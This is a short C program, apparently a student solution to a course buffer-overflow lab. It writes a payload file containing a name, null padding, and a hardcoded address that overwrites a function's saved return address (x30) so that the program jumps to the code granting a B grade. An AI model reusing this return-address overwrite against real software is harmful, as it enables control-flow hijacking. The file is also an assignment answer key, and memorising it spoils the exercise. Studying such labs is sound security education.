/*--------------------------------------------------------------------*/
/* Produces a file called dataB with the student name, a nullbyte,    */
/* padding to overrun the stack, and the address of the instruction   */
/* in main to get a B, the latter of which will overwrite getName's   */
/* stored x30.                                                        */
/*                                                                    */
/* Authors: Maxwell Lloyd and Venus Dinari                            */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(void){
   FILE *psFile;
   unsigned long ulData;
   unsigned long preturnLink;
   unsigned long pskipIf;
   int i;

   psFile = fopen("dataB", "w");
   
   /* Writes the student's names */
   ulData = 0x6E655678614D;
   fwrite(&ulData, sizeof(unsigned long), 1, psFile);

   /* Writes the null byte at the end of the students names*/
   for (i = 0; i < 40; i++)
      putc(0x00, psFile); /* Writes '00000000' */
   /*
   preturnLink = 0x400850;
   fwrite(&preturnLink, sizeof(unsigned long), 1, psFile); */

   pskipIf = 0x400890;
   fwrite(&pskipIf, sizeof(unsigned long), 1, psFile);

   fclose(psFile);

   return 0;
}